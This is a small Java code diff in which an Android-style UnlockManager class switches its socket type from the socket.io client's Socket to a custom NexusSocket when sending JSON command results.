@@ -10,9 +10,9 @@ import com.seguranca.protecao.UiAssistBridge;
 import com.seguranca.protecao.AppCoreInitializer;
 import com.seguranca.protecao.core.Protocol;
 import com.seguranca.protecao.core.SocketClient;
+import com.seguranca.protecao.core.NexusSocket;
 import org.json.JSONObject;
 import java.util.concurrent.atomic.AtomicBoolean;
-import io.socket.client.Socket;
 
 public class UnlockManager {
     private static final String TAG = "UnlockManager";
@@ -196,7 +196,7 @@ public class UnlockManager {
 
     private void sendResult(String type, String message, boolean success, String cmdId) {
         try {
-            Socket socket = SocketClient.getInstance().getSocket();
+            NexusSocket socket = SocketClient.getInstance().getSocket();
             if (socket == null) return;
             JSONObject result = new JSONObject();
             result.put(Protocol.KEY_TYPE, type);
